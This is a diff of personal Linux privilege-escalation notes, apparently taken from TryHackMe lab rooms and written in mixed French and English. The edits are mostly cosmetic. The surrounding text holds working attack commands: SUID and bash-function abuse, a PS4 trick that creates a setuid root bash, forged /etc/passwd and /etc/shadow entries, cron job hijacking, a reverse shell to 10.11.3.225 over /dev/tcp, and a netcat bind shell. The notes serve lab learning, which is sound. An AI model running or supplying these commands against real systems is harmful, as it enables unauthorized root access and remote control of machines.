@@ -1,13 +1,13 @@
 # Notes :  
-There are just a bunch of notes which I took from TryHackMe rooms and i always need   
-Don't take this repo to seriously  :)
+There are just a bunch of notes which I took from TryHackMe rooms and I always need   
+Don't take this repo to seriously  :)  
+May you will find a weird mixture of french and english and sometimes befkjznszb
 
-# Elévation des privilèges : 
+# PRIVILEGES ESCALATION : 
 
 ### Scripts : 
-LinEnum -> comme LinPeas  
-Enumerate privEsc factors  
-linux-exploit-suggester.sh  
+- LinEnum.sh & LinPeas.sh
+- linux-exploit-suggester.sh  
 
 ### Mettre LinEnum sur la machine cible :
 ```bash
@@ -27,7 +27,7 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 ```
 then search suspect SUID in GTFOBINS
 
-### SOME OF THE SUID MAY BE VULNERABLE : BE CAREFUL
+##### SOME OF THE SUID MAY BE VULNERABLE : BE CAREFUL
 
 ### KNOWN EXPLOIT : 
 looking for the exploit in exploit-db.com or google ...
@@ -39,8 +39,9 @@ looking for the exploit in exploit-db.com or google ...
 The  executable is identical to /usr/local/bin/suid-env  
 except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.  
 ```bash
-/bin/bash --version -> verify the version is under 4.2-048
+/bin/bash --version 
 ```
+- This works only if the version is under 4.2-048
 ```bash
 function /usr/sbin/service { /bin/bash -p; }
 export -f /usr/sbin/service
@@ -60,41 +61,43 @@ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootba
 
 ### WRITEABLE /ETC/PASSWD
 modifier le password du root / creer un nouvel account avec des perms root
-- create a new password hash : 
+- Create a new password hash : 
 ```bash
 openssl passwd -1 -salt [salt] [password]
 ```
-ou juste
+or
 ```bash
 openssl passwd [newpassword]
 ```
 
-***FORMAT PASSWD :***
-Exemple :
-```test:x:0:0:root:/root:/bin/bash```
-[as divided by colon (:)]  
+***FORMAT PASSWD :***  
+***Exemple :***   
+```test:x:0:0:root:/root:/bin/bash```  
+
+
 ***Username:*** It is used when user logs in. It should be between 1 and 32 characters in length.  
 ***Password:*** An x character indicates that encrypted password is stored in /etc/shadow file. sha512  
-***User ID (UID):***Each user must be assigned a user ID (UID).   
-***UID 0*** = root /  
-***UIDs 1-99*** other predefined accounts.  
-***UID 100-999*** are reserved by system for administrative and system accounts/groups.  
-***UID 1000+*** users  
+***User ID (UID):*** Each user must be assigned a user ID (UID).   
+***UID 0*:** = root   
+***UIDs 1-99:*** other predefined accounts.  
+***UID 100-999:*** are reserved by system for administrative and system accounts/groups.  
+***UID 1000+:*** users  
 ***Group ID (GID):*** The primary group ID (stored in /etc/group file)  
 ***User ID Info:*** extra information about the users.  
 ***Home directory:*** The absolute path to the directory the user will be in when they log in  
-***Command/shell:***The absolute path of a command or shell (/bin/bash). 
+***Command/shell:*** The absolute path of a command or shell (/bin/bash). 
 
 ### READABLE /ETC/SHADOW :
-crack the hash with john : it's supposed to be sha-512
+crack the hash with john/hashcat : it's supposed to be sha-512
 ### WRITABLE /ETC/SHADOW :
-make a new password : 
+Create a new password : 
 ```bash
 mkpasswd -m sha-512 newpasswordhere
 ```
 
 
 ### SHELL ESCAPE : https://gtfobins.github.io
+***This may needs user credentials***  
 ```bash
 sudo -l  
 ```
@@ -117,6 +120,8 @@ zsh
 csh 
 sh 
 ```
+***In RBASH, somes tools may be allowed and they can be useful***
+
 
 ### EXLOITING CRON JOBS :
 view which ones are actives : 
@@ -124,7 +129,9 @@ view which ones are actives :
 cat /etc/crontab
 ```
 On regarde si certains se lance avec des droits root et si on peut les modifier  
-Si oui, il y a la place pour un reverse shell  
+(Typiquement un backup.sh)
+Si oui, il y a la place pour un reverse shell ou une modification de /etc/sudoers
+
 
 
 ***Format =# = ID***  
@@ -474,12 +481,12 @@ bash -i >& /dev/tcp/10.11.3.225/1234 0>&1
 ```
 
 ### BIND SHELL :
-*** Remote ***
+***Remote***
 ```bash
 nc -nlvp 51337 -e /bin/bash
 ```
 
-*** Local ***
+***Local***
 ```bash
 nc IP 51337
 ```
